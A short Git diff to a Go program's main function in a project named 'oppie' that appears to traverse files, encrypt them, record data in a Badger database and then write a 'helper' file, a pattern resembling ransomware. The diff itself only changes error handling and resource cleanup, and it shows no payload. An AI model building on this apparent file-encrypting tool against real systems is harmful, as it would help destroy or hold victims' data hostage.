@@ -2,9 +2,9 @@ package main
 
 import (
 	"fmt"
-	"time"
 
 	"github.com/savi2w/oppie/encrypt"
+	"github.com/savi2w/oppie/fsutil"
 	"github.com/savi2w/oppie/osutil"
 	"github.com/savi2w/oppie/storage"
 	"github.com/savi2w/oppie/traversal"
@@ -13,12 +13,16 @@ import (
 func main() {
 	badger, err := storage.New()
 	if err != nil {
-		panic(err)
+		fmt.Printf("Error starting Badger database: %s\n", err.Error())
+		return
 	}
+
+	defer badger.Close()
 
 	core, err := encrypt.New()
 	if err != nil {
-		panic(err)
+		fmt.Printf("Error starting encryption core: %s\n", err.Error())
+		return
 	}
 
 	traversal := traversal.New(badger, core)
@@ -37,7 +41,8 @@ func main() {
 
 	fmt.Println("Done iterating...")
 
-	// For some reason defer is giving me a error
-	time.Sleep(16 * time.Second)
-	badger.Close()
+	if err := fsutil.WriteHelper(); err != nil {
+		fmt.Printf("Error writing helper: %s\n", err.Error())
+		return
+	}
 }
